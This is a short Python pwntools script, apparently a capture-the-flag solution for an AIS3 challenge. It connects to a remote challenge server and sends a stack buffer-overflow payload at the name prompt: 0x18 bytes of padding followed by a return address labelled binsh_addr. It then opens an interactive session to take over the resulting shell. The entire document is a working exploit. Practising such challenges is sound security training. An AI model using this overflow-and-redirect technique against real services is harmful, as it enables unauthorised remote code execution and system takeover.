from pwn import *

context.arch='amd64'
context.terminal=['tmux','splitw','-h']


sh = remote('chals1.ais3.org', 12347)
binsh_addr = 0x00401216

sh.sendlineafter("What's your name?",b'A'*0x10+b'A'*0x8+p64(binsh_addr))

sh.interactive()


